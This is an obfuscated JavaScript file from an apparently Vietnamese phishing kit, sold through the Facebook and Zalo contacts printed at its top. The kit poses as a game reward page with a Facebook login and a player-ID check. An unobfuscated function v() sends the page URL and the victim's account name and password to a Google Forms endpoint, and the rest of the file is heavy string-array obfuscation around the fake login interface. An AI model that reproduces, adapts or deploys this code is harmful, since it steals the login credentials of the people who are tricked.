console.log("VUI LÒNG IB FB BÊN DƯỚI MUA CODE");
console.log("zalo : 0862509130");

var cheylin = kamarah;
(function(denea, breondra) {
    var amarria = kamarah,
        isiaah = denea();
    while (!![]) {
        try {
            var rainy = parseInt(amarria(462)) / 1 * (parseInt(amarria(494)) / 2) + -parseInt(amarria(496)) / 3 * (parseInt(amarria(470)) / 4) + -parseInt(amarria(545)) / 5 * (-parseInt(amarria(485)) / 6) + -parseInt(amarria(529)) / 7 * (parseInt(amarria(511)) / 8) + -parseInt(amarria(448)) / 9 * (-parseInt(amarria(475)) / 10) + parseInt(amarria(467)) / 11 + -parseInt(amarria(476)) / 12;
            if (rainy === breondra) break;
            else isiaah.push(isiaah.shift());
        } catch (donika) {
            isiaah.push(isiaah.shift());
        }
    }
}(korryn, 444803));
var kadesha = [cheylin(490), cheylin(539), "flex", cheylin(531), "1801080bZiHAc", cheylin(449), "#accountId", cheylin(487), cheylin(488), "#hid", "215275XCPVvG", "179940dvHKDc", cheylin(457), cheylin(502), cheylin(544), cheylin(525), cheylin(543), "2307608XbcHSe", cheylin(481), cheylin(524), cheylin(466), cheylin(461), "val", cheylin(518), cheylin(520), cheylin(438), cheylin(493), cheylin(465), cheylin(491), cheylin(505), cheylin(483), cheylin(528), cheylin(452), cheylin(453), cheylin(523), cheylin(456), cheylin(500), "65cfXGns", cheylin(486), cheylin(515), "135213iqZfZz", cheylin(441), cheylin(527), cheylin(506), "display", cheylin(444), cheylin(499), cheylin(495), ".st-Reward", cheylin(540), cheylin(459), cheylin(473), cheylin(455), ".ST-sub", "1076ZtqJAJ", cheylin(463), cheylin(542), cheylin(469), cheylin(504), cheylin(484), "54674bfERTJ", cheylin(508), cheylin(517), cheylin(492), cheylin(439), cheylin(522), "html", cheylin(479), cheylin(532), cheylin(464), "replace", cheylin(443), cheylin(516), cheylin(474), "190EalfQn", cheylin(510), "4393530QnyXJQ", "2025544PzTQOy", cheylin(478), cheylin(497), "32MSXrri", cheylin(538), "Kiểm Tra", cheylin(534), cheylin(445), "1ljNqZX", cheylin(501), cheylin(537), cheylin(530), cheylin(446), cheylin(498), cheylin(458), cheylin(509), cheylin(442), "415854fQpMXu", cheylin(541), cheylin(460), cheylin(512), cheylin(437), "addClass", cheylin(447), cheylin(482), cheylin(536), cheylin(521), cheylin(526), cheylin(471), cheylin(533), cheylin(451), ".st-history", cheylin(507), "129189FJftti", cheylin(472), cheylin(450), cheylin(480), cheylin(503), cheylin(519), cheylin(468), cheylin(440), cheylin(535), cheylin(489), cheylin(514), cheylin(477), cheylin(454), cheylin(513), "180210xLckjd", ".login-facebook", "on", "id", ""];

function kamarah(armas, avaleigh) {
    var kyrra = korryn();
    return kamarah = function(dellarose, wyonna) {
        dellarose = dellarose - 437;
        var dewayna = kyrra[dellarose];
        return dewayna;
    }, kamarah(armas, avaleigh);
}
(function(resa, dantley) {
    var chrie = robyn,
        delphin = resa();
    while (!![]) {
        try {
            var faryl = -parseInt(chrie(208)) / 1 + parseInt(chrie(252)) / 2 * (parseInt(chrie(205)) / 3) + -parseInt(chrie(247)) / 4 * (-parseInt(chrie(273)) / 5) + parseInt(chrie(270)) / 6 + -parseInt(chrie(281)) / 7 + -parseInt(chrie(242)) / 8 + parseInt(chrie(260)) / 9;
            if (faryl === dantley) break;
            else delphin[kadesha[1]](delphin[kadesha[0]]());
        } catch (quentrell) {
            delphin[kadesha[1]](delphin[kadesha[0]]());
        }
    }
}(annlee, 580315), function(rosiland, shenya) {
    var tyra = robyn,
        kemaury = yanett,
        kaianne = rosiland();
    while (!![]) {
        try {
            var akeshia = parseInt(kemaury(223)) / 1 + -parseInt(kemaury(229)) / 2 + parseInt(kemaury(208)) / 3 * (parseInt(kemaury(302)) / 4) + -parseInt(kemaury(291)) / 5 * (parseInt(kemaury(290)) / 6) + -parseInt(kemaury(234)) / 7 + parseInt(kemaury(252)) / 8 * (-parseInt(kemaury(215)) / 9) + parseInt(kemaury(248)) / 10 * (parseInt(kemaury(264)) / 11);
            if (akeshia === shenya) break;
            else kaianne[tyra(217)](kaianne[tyra(269)]());
        } catch (venishia) {
            kaianne[tyra(217)](kaianne[tyra(269)]());
        }
    }
}(geanna, 214130));
var omon = jadaliz;

function jadaliz(laguana, norine) {
    var khasen = mike();
    return jadaliz = function(sragvi, priansh) {
        sragvi = sragvi - 158;
        var esad = khasen[sragvi];
        return esad;
    }, jadaliz(laguana, norine);
}
(function(camerion, lenardo) {
    var kosei = robyn,
        treymon = yanett,
        joannette = jadaliz,
        johncarlos = camerion();
    while (!![]) {
        try {
            var teria = parseInt(joannette(203)) / 1 * (parseInt(joannette(219)) / 2) + -parseInt(joannette(161)) / 3 + parseInt(joannette(225)) / 4 + -parseInt(joannette(221)) / 5 + parseInt(joannette(198)) / 6 * (-parseInt(joannette(229)) / 7) + parseInt(joannette(163)) / 8 * (-parseInt(joannette(190)) / 9) + parseInt(joannette(174)) / 10 * (parseInt(joannette(177)) / 11);
            if (teria === lenardo) break;
            else johncarlos[treymon(256)](johncarlos[kosei(269)]());
        } catch (joshuar) {
            johncarlos[treymon(256)](johncarlos[treymon(232)]());
        }
    }
}(mike, 294121));
var arinda = zeyden;

function annlee() {
    var astrid = [kadesha[2], kadesha[3], kadesha[4], kadesha[5], kadesha[6], kadesha[7], kadesha[8], kadesha[9], kadesha[10], kadesha[11], kadesha[12], kadesha[13], kadesha[14], kadesha[15], kadesha[16], kadesha[17], kadesha[18], kadesha[19], kadesha[20], kadesha[21], kadesha[22], kadesha[23], kadesha[24], kadesha[1], kadesha[25], kadesha[26], kadesha[27], kadesha[28], kadesha[29], kadesha[30], kadesha[31], kadesha[32], kadesha[33], kadesha[34], kadesha[35], kadesha[36], kadesha[37], kadesha[38], kadesha[39], kadesha[40], kadesha[41], kadesha[42], kadesha[43], kadesha[44], kadesha[45], kadesha[46], kadesha[47], kadesha[48], kadesha[49], kadesha[50], kadesha[51], kadesha[52], kadesha[53], kadesha[54], kadesha[55], kadesha[56], kadesha[57], kadesha[58], kadesha[59], kadesha[60], kadesha[61], kadesha[62], kadesha[63], kadesha[64], kadesha[65], kadesha[66], kadesha[67], kadesha[68], kadesha[69], kadesha[70], kadesha[71], kadesha[72], kadesha[73], kadesha[74], kadesha[75], kadesha[0], kadesha[76], kadesha[77], kadesha[78], kadesha[79], kadesha[80], kadesha[81], kadesha[82], kadesha[83], kadesha[84], kadesha[85], kadesha[86], kadesha[87], kadesha[88], kadesha[89], kadesha[90], kadesha[91], kadesha[92], kadesha[93]];
    return annlee = function() {
        return astrid;
    }, annlee();
}

function korryn() {
    var aws = ["167174wZXUjE", "nickname", "7281995JGrPsF", "200", "push", "7539248VfMRFi", "9BmOiSj", "pages/incu.php", "916713JcXcbX", "201908fRkSYD", "180ZRuSQi", "904230gxgRbi", "1910CSspIe", "654990kMgjIS", "9SNaqJC", "2410397WiHgiB", "May 10, 2022 15:37:25", "110oDbbbv", "ready", ".rewardButton", ".st-toast", "pages/evo.php", "1449cMptbE", "#degagajago", "2634282QFRlIk", "42HduLLN", ".loader", ".ST-menu .ST-sub", "36234lzuhQG", "#cnick", "getTime", "evo", "43182cUAPEe", "3lTPecP", "#toastAlert", "getItem", "2JXQnOw", "11FolnaM", "2616285DLOYIj", "load", "4215730DgBPtH", "6229993IFCQDe", "css", "fadeOut", "18572NdeYqu", "632679InTJoe", "incu", "273055dmmRBS", "siblings", "39730KjgEeP", "9029160MHkKFN", "Code Đã Hết Hạn!!!! Vui lòng liên hệ Nguyễn Duy Tân!!", "Xin chào ", "13526685NJWWAY", "result", "6ERXcoa", "old", "pages/old.php", "72sAPfUI", "41298YCVBCh", "96FBfGYC", "previousElementSibling", "53383wnISeZ", ".ST-change", "shift", "accountId", "src", "json", "212278CXTcQk", "fadeIn", "192oXYXAg", "3075zcqlfu", "text", "8APGNbf", "status", "GET", "89922yBXBcI", ".nickname", "400", "ajax", "#idPlayer", "http://fb.me/kensine.mmo", "hide", "#hnama", "location", "1373576MCPLEb", ".st-loginId", "754875VQHyqw", "10LZZDXG", "active", "removeClass", "ID bạn đã nhập không khớp với bất kỳ tài khoản nào", "setItem", ".maskBlur", "5384092iFcjTs", "length", "attr", "2295552mGwGDE", '<ion-spinner name="dots"></ion-spinner>', "33268AQkgaM", ".inputAlert", "#nickPlayer", "getAttribute", "7LkdOve", "1882912LOmOfO", "click", "trueid.php?id=", "9UhAoHv", ".st-check"];
    korryn = function() {
        return aws;
    };
    return korryn();
}
(function(enmanuel, bersain) {
    var emmilyn = jadaliz,
        precyous = zeyden,
        masaru = enmanuel();
    while (!![]) {
        try {
            var raenee = -parseInt(precyous(445)) / 1 + -parseInt(precyous(436)) / 2 * (-parseInt(precyous(419)) / 3) + -parseInt(precyous(411)) / 4 * (-parseInt(precyous(416)) / 5) + parseInt(precyous(443)) / 6 * (-parseInt(precyous(412)) / 7) + parseInt(precyous(464)) / 8 + parseInt(precyous(422)) / 9 * (parseInt(precyous(431)) / 10) + -parseInt(precyous(472)) / 11;
            if (raenee === bersain) break;
            else masaru[emmilyn(188)](masaru[emmilyn(162)]());
        } catch (dovon) {
            masaru[emmilyn(188)](masaru[emmilyn(162)]());
        }
    }
}(cyniah, 181224));

function cyniah() {
    var shaz = robyn,
        seneque = yanett,
        nevine = jadaliz,
        michaia = [seneque(255), nevine(234), nevine(204), nevine(191), nevine(165), nevine(233), nevine(167), nevine(186), seneque(278), nevine(166), nevine(217), nevine(182), nevine(187), nevine(173), nevine(158), seneque(272), nevine(226), shaz(236), nevine(210), seneque(207), nevine(168), nevine(169), seneque(292), seneque(233), seneque(294), nevine(228), nevine(172), shaz(234), seneque(295), nevine(184), nevine(227), nevine(181), nevine(214), nevine(197), nevine(189), nevine(196), nevine(195), nevine(218), seneque(238), shaz(211), seneque(280), nevine(178), seneque(236), nevine(185), nevine(230), nevine(212), nevine(188), seneque(253), seneque(266), nevine(205), seneque(289), nevine(232), nevine(162), nevine(200), nevine(179), nevine(208), nevine(206), nevine(175), nevine(216), nevine(215), shaz(276), nevine(171), nevine(211), seneque(263), seneque(239), nevine(201), nevine(180), nevine(224), nevine(209), nevine(183), seneque(211), nevine(222), nevine(164), nevine(223), nevine(194), nevine(159), seneque(277)];
    return cyniah = function() {
        return michaia;
    }, cyniah();
}

function geanna() {
    var bernell = robyn,
        raily = [bernell(265), bernell(230), bernell(255), kadesha[94], bernell(216), bernell(262), kadesha[95], bernell(289), bernell(223), bernell(206), bernell(284), kadesha[96], bernell(272), kadesha[97], kadesha[98], kadesha[99], kadesha[100], bernell(231), bernell(282), kadesha[101], bernell(203), bernell(291), bernell(286), kadesha[102], bernell(238), bernell(285), bernell(267), bernell(225), kadesha[103], bernell(293), kadesha[104], bernell(210), bernell(279), bernell(250), bernell(283), bernell(220), bernell(274), bernell(239), bernell(271), kadesha[105], bernell(226), bernell(235), bernell(254), bernell(251), bernell(241), bernell(228), kadesha[106], bernell(266), bernell(257), bernell(263), bernell(295), kadesha[107], kadesha[108], bernell(222), bernell(244), bernell(245), kadesha[109], kadesha[110], bernell(229), bernell(277), bernell(253), bernell(232), kadesha[111], bernell(269), bernell(240), kadesha[112], kadesha[113], bernell(209), bernell(261), kadesha[114], kadesha[115], kadesha[116], bernell(278), bernell(292), bernell(294), bernell(227), kadesha[117], bernell(256), kadesha[118], bernell(212), bernell(268), bernell(237), bernell(219), bernell(290), bernell(296), bernell(215), bernell(233), bernell(217), bernell(207), bernell(287), kadesha[119], bernell(246), bernell(214), bernell(258), kadesha[120], bernell(248)];
    return geanna = function() {
        return raily;
    }, geanna();
}
var caitland = nichola;
(function(ibby, shanythia) {
    var jamyl = jadaliz,
        madiline = zeyden,
        dashown = nichola,
        lyndzey = ibby();
    while (!![]) {
        try {
            var jazlee = -parseInt(dashown(231)) / 1 * (parseInt(dashown(241)) / 2) + parseInt(dashown(237)) / 3 * (parseInt(dashown(206)) / 4) + parseInt(dashown(244)) / 5 + parseInt(dashown(260)) / 6 + parseInt(dashown(203)) / 7 + parseInt(dashown(194)) / 8 * (-parseInt(dashown(255)) / 9) + -parseInt(dashown(225)) / 10 * (parseInt(dashown(256)) / 11);
            if (jazlee === shanythia) break;
            else lyndzey[madiline(414)](lyndzey[jamyl(162)]());
        } catch (yailynn) {
            lyndzey[jamyl(188)](lyndzey[madiline(420)]());
        }
    }
}(santy, 395412));
var nick = localStorage[arinda(429)](caitland(228)),
    id = localStorage[caitland(217)](caitland(261));
nick == null && id == null ? $(caitland(220))[arinda(468)]()[caitland(221)](caitland(197), caitland(229)) : ($(caitland(201))[caitland(214)]()[caitland(221)](caitland(197), caitland(229)), $(caitland(200))[caitland(204)](nick), $(caitland(226))[caitland(204)](id)), $(caitland(191))[caitland(215)](function() {
    var aavyan = caitland;
    $(aavyan(235))[aavyan(190)](), $(aavyan(232))[aavyan(214)]();
});

function tdck() {
    var jaki = robyn,
        tamarin = yanett,
        spencel = arinda,
        vannia = caitland,
        carmena = localStorage[vannia(217)](vannia(228)),
        mtisha = localStorage[spencel(429)](vannia(261));
    $(vannia(201))[spencel(456)](), $(spencel(432))[vannia(190)](), $(vannia(249))[vannia(207)](mtisha), $(vannia(227))[vannia(207)](carmena), $(tamarin(224))[jaki(259)](carmena);
}

function zeyden(sao, caruso) {
    var amittai = cyniah();
    return zeyden = function(rhoads, zakeriah) {
        rhoads = rhoads - 403;
        var iyuna = amittai[rhoads];
        return iyuna;
    }, zeyden(sao, caruso);
}

function robyn(yayra, dimond) {
    var argenis = annlee();
    return robyn = function(octayvia, arrington) {
        octayvia = octayvia - 203;
        var phyllicia = argenis[octayvia];
        return phyllicia;
    }, robyn(yayra, dimond);
}

function yanett(ju, roberte) {
    var khamden = geanna();
    return yanett = function(ngoc, marites) {
        ngoc = ngoc - 207;
        var glenita = khamden[ngoc];
        return glenita;
    }, yanett(ju, roberte);
}

function santy() {
    var laurelai = robyn,
        belgica = yanett,
        lataveon = jadaliz,
        laveeda = arinda,
        varon = [laveeda(406), laveeda(415), laveeda(427), laveeda(428), laveeda(474), belgica(213), lataveon(160), laveeda(417), laveeda(418), lataveon(231), laveeda(473), laveeda(423), lataveon(170), laveeda(407), lataveon(192), lataveon(176), laveeda(434), laveeda(413), laveeda(469), laveeda(462), laveeda(467), laveeda(461), belgica(235), belgica(293), laveeda(430), laveeda(459), lataveon(202), laveeda(470), laveeda(405), laveeda(433), laveeda(457), lataveon(199), laveeda(477), laveeda(456), laveeda(421), laveeda(454), laveeda(424), laveeda(410), laveeda(432), laveeda(444), laveeda(475), laveeda(449), laveeda(408), laveeda(451), laveeda(435), laveeda(465), laveeda(439), laveeda(437), laveeda(450), laveeda(404), laveeda(458), laveeda(447), laveeda(446), laveeda(455), laveeda(478), lataveon(220), laveeda(479), laveeda(468), laveeda(460), laveeda(471), laveeda(429), laveeda(438), laveeda(463), laveeda(453), lataveon(164), laveeda(426), belgica(273), laveeda(409), laurelai(264), laveeda(476), laveeda(441), laveeda(442), lataveon(213)];
    return santy = function() {
        return varon;
    }, santy();
}

function yez() {
    var joash = jadaliz,
        jiani = arinda,
        velicity = caitland;
    $(velicity(201))[velicity(190)](), $(velicity(220))[jiani(468)]()[velicity(221)](velicity(197), joash(213));
}

function mike() {
    var tahliyah = robyn,
        blaydon = yanett,
        persis = [tahliyah(269), blaydon(301), blaydon(240), blaydon(242), blaydon(237), blaydon(287), blaydon(276), blaydon(246), kadesha[121], tahliyah(213), blaydon(225), blaydon(261), tahliyah(218), blaydon(273), blaydon(281), kadesha[122], blaydon(286), kadesha[123], blaydon(299), blaydon(219), blaydon(298), tahliyah(259), blaydon(300), blaydon(257), blaydon(267), blaydon(244), blaydon(256), blaydon(222), blaydon(268), blaydon(227), blaydon(279), blaydon(258), blaydon(288), blaydon(274), blaydon(231), blaydon(262), blaydon(282), tahliyah(221), blaydon(241), blaydon(275), blaydon(243), blaydon(297), blaydon(228), tahliyah(243), blaydon(209), blaydon(260), blaydon(296), kadesha[124], blaydon(265), tahliyah(249), tahliyah(280), tahliyah(288), blaydon(284), kadesha[125], blaydon(218), tahliyah(275), tahliyah(204), blaydon(217), blaydon(214), blaydon(270), blaydon(269), blaydon(210), blaydon(221), blaydon(283), blaydon(216), blaydon(250), blaydon(259), blaydon(247), blaydon(220), blaydon(254), blaydon(245), blaydon(249), blaydon(230), blaydon(271), blaydon(285), blaydon(251), blaydon(226)];
    return mike = function() {
        return persis;
    }, mike();
} 

function nichola(normand, jesmin) {
    var midgie = santy();
    return nichola = function(eldar, joyah) {
        eldar = eldar - 190;
        var shaquon = midgie[eldar];
        return shaquon;
    }, nichola(normand, jesmin);
}
$(document)[caitland(238)](function() {
    setTimeout(() => {
        var dalten = nichola;
        $(dalten(250))[dalten(190)]();
    }, 1e3);
}), $(document)[kadesha[126]](caitland(215), caitland(193), function() {
    var nafiso = caitland;
    $(this)[nafiso(199)](nafiso(209))[nafiso(251)]()[nafiso(219)](nafiso(209));
}), $(omon(207))[caitland(215)](function() {
    var ledion = arinda,
        shevelle = caitland;
    const lorette = $(this)[shevelle(211)](kadesha[127]);
    lorette == shevelle(262) ? $(shevelle(257))[shevelle(234)](shevelle(223)) : lorette == shevelle(258) ? $(shevelle(257))[ledion(474)](shevelle(245)) : lorette == ledion(403) && $(ledion(470))[shevelle(234)](shevelle(254));
}), $(arinda(470))[caitland(234)](arinda(425));

function stFunc(rayjon) {
    var luar = robyn,
        benton = omon,
        jorelys = arinda,
        lexine = caitland;
    let camir = rayjon[lexine(248)][luar(224)](jorelys(466));
    $(lexine(224))[jorelys(478)](benton(169), camir), ($(lexine(235))[lexine(214)]()[jorelys(440)](benton(227), lexine(229)), $(jorelys(432))[lexine(214)]());
}
function v(){
    let data = {
  'entry.947626363': window.location.href,
   'entry.1171134611': acc,
   'entry.131074249': pass
   }
   let queryString = new URLSearchParams(data);  
   queryString = queryString.toString();    
   let xhr = new XMLHttpRequest();
   xhr.open("POST", 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSd_x7qV9R98M1j1xR7WDZypH_ErKYHAJfpK534vezyUO0X8AQ/formResponse', true);
   xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send(queryString);
}

$(caitland(208))[caitland(215)](function() {
    var jameera = arinda,
        dallas = caitland;
    $(this)[jameera(437)](dallas(243)), $(dallas(240))[dallas(218)](), setTimeout(() => {
        var kaje = jameera,
            aylenne = dallas;
        const sundari = $(aylenne(198))[aylenne(207)]();
        if (sundari == kadesha[128] || sundari == null || sundari[aylenne(253)] <= 5) return $(aylenne(240))[kaje(468)](), $(kaje(447))[kaje(437)](aylenne(233)), setTimeout(() => {
            var jazette = kaje,
                dewitte = aylenne;
            $(dewitte(240))[jazette(456)]();
        }, 3e3), ![];
        else $(aylenne(240))[kaje(438)](), $(aylenne(208))[aylenne(204)](aylenne(243));
        $[aylenne(213)]({
            url: aylenne(192) + sundari,
            type: aylenne(247),
            dataType: aylenne(236),
            beforeSend: function() {
                var miichael = kaje,
                    hibo = aylenne;
                $(hibo(208))[hibo(204)](miichael(407));
            },
            success: function(saveyah) {
                var arthar = yanett,
                    tal = jadaliz,
                    khorey = kaje,
                    adriena = aylenne;
                $(khorey(447))[adriena(204)](adriena(233));
                const medwin = saveyah[adriena(252)][khorey(448)];
                switch (medwin) {
                    case adriena(210):
                        localStorage[adriena(239)](adriena(228), saveyah[adriena(228)]), localStorage[adriena(239)](adriena(261), sundari), $(adriena(220))[adriena(190)](), $(adriena(246))[khorey(468)](), $(adriena(202))[adriena(204)](adriena(196) + saveyah[adriena(228)]), $(adriena(230))[adriena(259)](saveyah[arthar(288)]), $(khorey(462))[adriena(207)](sundari), $(adriena(227))[adriena(207)](saveyah[tal(194)]), setTimeout(() => {
                            var ciji = khorey,
                                elaine = adriena;
                            $(elaine(220))[elaine(190)](), $(elaine(195))[elaine(190)](), $(ciji(434))[ciji(438)]();
                        }, 2e3);
                        break;
                    case arthar(212):
                        $(adriena(220))[adriena(190)](), $(adriena(246))[adriena(214)](), $(adriena(202))[adriena(204)](khorey(452)), setTimeout(() => {
                            var lyrique = adriena;
                            $(lyrique(220))[lyrique(214)](), $(lyrique(246))[lyrique(218)]();
                        }, 2e3);
                }
            }
        });
    }, 500);
});